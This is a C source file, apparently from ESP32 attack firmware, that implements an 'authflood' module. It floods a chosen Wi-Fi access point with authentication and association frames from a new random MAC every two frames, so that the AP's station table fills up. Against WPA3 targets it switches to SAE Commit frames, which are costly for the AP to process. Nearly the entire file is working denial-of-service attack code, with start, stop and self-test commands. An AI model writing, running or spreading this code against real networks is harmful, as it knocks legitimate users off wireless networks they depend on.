// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// Auth / Assoc 洪泛：每个身份都换一个新 MAC，挤占 AP 的 station 表和状态机。
// 目标是 WPA3 时可以改成发 SAE Commit，那条路 AP 每帧都要算一次标量乘。

#include <string.h>

#include "attacks/attack.h"
#include "attacks/attack_common.h"
#include "hal_wifi/hal_wifi.h"
#include "wbus/wbus.h"
#include "wifi_frame/frame_build.h"
#include "wifi_frame/frames.h"
#include "wifi_frame/ie_build.h"
#include "wifi_frame/ie_parse.h"
#include "wtarget/wtarget.h"

#define OWNER "authflood"
#define CAPAB_ESS 0x0401
#define LISTEN_INTERVAL 10
// 同一个身份发几帧再换，太勤了连 auth 状态都留不住，太懒了表项攒不起来
#define FRAMES_PER_IDENTITY 2

typedef enum {
    MODE_BOTH = 0,
    MODE_AUTH = 1,
    MODE_ASSOC = 2,
} flood_mode_t;

static bool s_active;
static uint8_t s_bssid[6];
static uint8_t s_channel;
static flood_mode_t s_mode = MODE_BOTH;
static bool s_upgrade;
static bool s_sae_target;
static uint8_t s_identity[6];
static uint32_t s_identity_frames;
static uint32_t s_identities;
static uint32_t s_frames;
static uint32_t s_auth_frames;
static uint32_t s_assoc_frames;
static uint32_t s_sae_frames;
static bool s_next_assoc;

static int build_auth(uint8_t *buf, size_t cap) {
    // algorithm=0（开放）、seq=1、status=0，正是客户端刚发起认证时的样子
    return wf_build_auth(buf, cap, s_bssid, s_identity, s_bssid, 0, 1, 0);
}

static int build_assoc(uint8_t *buf, size_t cap) {
    uint8_t ies[128];
    wf_ie_writer_t w;
    wf_ie_begin(&w, ies, sizeof(ies));
    wf_ie_ssid(&w, "", 0);
    wf_ie_rates(&w, 1, 0x0C);
    if (s_sae_target) {
        wf_ie_rsn_sae(&w);
    } else {
        wf_ie_rsn_psk(&w);
    }
    wf_ie_extcap_btm(&w);
    if (!wf_ie_ok(&w)) {
        return -1;
    }
    return wf_build_assoc_req(buf, cap, s_bssid, s_identity, s_bssid, CAPAB_ESS, LISTEN_INTERVAL,
                              ies, wf_ie_len(&w));
}

static void authflood_tick(uint32_t now_ms) {
    (void)now_ms;
    if (!s_active) {
        return;
    }
    static uint8_t frame[WF_FRAME_CAP];

    if (s_identity_frames >= FRAMES_PER_IDENTITY) {
        attack_random_mac(s_identity);
        s_identity_frames = 0;
        s_identities++;
    }
    s_identity_frames++;

    // WPA3 目标 + 允许升级：改发 SAE Commit，那一帧在 AP 侧贵得多
    if (s_upgrade && s_sae_target) {
        uint8_t scalar[ATTACK_SAE_SCALAR_LEN];
        uint8_t element[ATTACK_SAE_ELEMENT_LEN];
        attack_sae_fill(scalar, element, true);
        const int len = attack_build_sae_commit(frame, sizeof(frame), s_bssid, s_identity, s_bssid,
                                                scalar, element);
        if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
            s_frames++;
            s_sae_frames++;
        }
        return;
    }

    bool send_assoc = (s_mode == MODE_ASSOC);
    if (s_mode == MODE_BOTH) {
        send_assoc = s_next_assoc;
        s_next_assoc = !s_next_assoc;
    }
    const int len = send_assoc ? build_assoc(frame, sizeof(frame)) : build_auth(frame, sizeof(frame));
    if (len > 0 && hal_wifi_tx(frame, (uint16_t)len) == ESP_OK) {
        s_frames++;
        if (send_assoc) {
            s_assoc_frames++;
        } else {
            s_auth_frames++;
        }
    }
}

static const wb_policy_t kStartPolicy[] = {
    {.name = "idx", .type = WB_T_IDX, .required = true, .min = 1, .max = WT_MAX_ENTRIES},
    {.name = "mode", .type = WB_T_STR, .required = false, .def_str = "both"},
    {.name = "upgrade", .type = WB_T_BOOL, .required = false, .def = 1},
};

static esp_err_t authflood_start(wb_args_t *args, wb_reply_t *reply) {
    wt_entry_t ap;
    if (!attack_target_ap(wb_args_u32(args, "idx"), &ap)) {
        wb_reply_fail(reply, "idx 不是 AP，先跑 scan.start");
        return ESP_ERR_INVALID_ARG;
    }
    const char *mode = wb_args_str(args, "mode");
    if (strcmp(mode, "auth") == 0) {
        s_mode = MODE_AUTH;
    } else if (strcmp(mode, "assoc") == 0) {
        s_mode = MODE_ASSOC;
    } else if (strcmp(mode, "both") == 0) {
        s_mode = MODE_BOTH;
    } else {
        wb_reply_fail(reply, "mode 只能是 both / auth / assoc");
        return ESP_ERR_INVALID_ARG;
    }
    s_upgrade = wb_args_bool(args, "upgrade");

    attack_exclusive();
    memcpy(s_bssid, ap.bssid, 6);
    s_channel = ap.channel;
    s_sae_target = ap.sae;
    attack_random_mac(s_identity);
    s_identity_frames = 0;
    s_identities = 1;
    s_frames = 0;
    s_auth_frames = 0;
    s_assoc_frames = 0;
    s_sae_frames = 0;
    s_next_assoc = false;

    const esp_err_t err = attack_pin(OWNER, s_channel);
    if (err != ESP_OK) {
        wb_reply_fail(reply, "占不到信道 %u（%s）", (unsigned)s_channel, esp_err_to_name(err));
        return err;
    }
    s_active = true;
    attack_emit("authflood", true, "ch=%u", (unsigned)s_channel);

    if (s_sae_target && s_upgrade) {
        wb_reply_line(reply, "authflood 开跑 ch=%u 目标是 WPA3，改发 SAE Commit",
                      (unsigned)s_channel);
    } else {
        wb_reply_line(reply, "authflood 开跑 ch=%u mode=%s%s", (unsigned)s_channel, mode,
                      (s_sae_target && !s_upgrade) ? "（WPA3，已按参数关掉升级）" : "");
    }
    return ESP_OK;
}

static void authflood_stop(void) {
    if (!s_active) {
        return;
    }
    s_active = false;
    attack_unpin(OWNER);
    attack_emit("authflood", false, NULL);
}

static esp_err_t authflood_stop_cmd(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    const uint32_t frames = s_frames;
    const uint32_t identities = s_identities;
    const uint32_t auth = s_auth_frames;
    const uint32_t assoc = s_assoc_frames;
    const uint32_t sae = s_sae_frames;
    authflood_stop();
    attack_report_rate(reply, "authflood", frames);
    wb_reply_line(reply, "identities=%u auth=%u assoc=%u sae=%u",
                  (unsigned)identities, (unsigned)auth, (unsigned)assoc,
                  (unsigned)sae);
    return ESP_OK;
}

static esp_err_t authflood_test(wb_args_t *args, wb_reply_t *reply) {
    (void)args;
    uint8_t frame[WF_FRAME_CAP];

    const uint8_t identity[6] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
    if (s_bssid[0] == 0) {
        static const uint8_t kAp[6] = {0x06, 0xAA, 0xBB, 0xCC, 0xDD, 0xEE};
        memcpy(s_bssid, kAp, 6);
    }
    memcpy(s_identity, identity, 6);

    int len = build_auth(frame, sizeof(frame));
    if (len <= 0) {
        wb_reply_fail(reply, "auth 组帧失败");
        return ESP_FAIL;
    }
    wb_reply_line(reply, "auth len=%d algo=%u seq=%u", len,
                  (unsigned)(frame[24] | (frame[25] << 8)),
                  (unsigned)(frame[26] | (frame[27] << 8)));

    len = build_assoc(frame, sizeof(frame));
    if (len <= 0) {
        wb_reply_fail(reply, "assoc 组帧失败");
        return ESP_FAIL;
    }
    size_t body = 0;
    const uint8_t *rsn = wf_ie_find(frame + 28, (size_t)(len - 28), WF_IE_RSN, &body);
    wb_reply_line(reply, "assoc len=%d rsn=%s", len,
                  rsn != NULL ? (wf_rsn_has_akm(rsn, body, WF_AKM_SAE) ? "sae" : "psk") : "none");
    return ESP_OK;
}

static const wb_method_t kMethods[] = {
    {"start", authflood_start, "idx=1..64 [mode=both|auth|assoc] [upgrade=bool]", kStartPolicy, 3},
    {"stop", authflood_stop_cmd, "", NULL, 0},
    {"test", authflood_test, "", NULL, 0},
};

static const wb_object_t kObject = {
    .name = "authflood",
    .title = "Auth flood",
    .methods = kMethods,
    .n_methods = sizeof(kMethods) / sizeof(kMethods[0]),
};

static uint32_t authflood_frames(void) {
    return s_frames;
}

static bool authflood_active(void) {
    return s_active;
}

static const attack_driver_t kDriver = {
    .name = "authflood",
    .object = &kObject,
    .stop = authflood_stop,
    .tick = authflood_tick,
    .frames = authflood_frames,
    .active = authflood_active,
};

const attack_driver_t *authflood_attack(void) {
    return &kDriver;
}
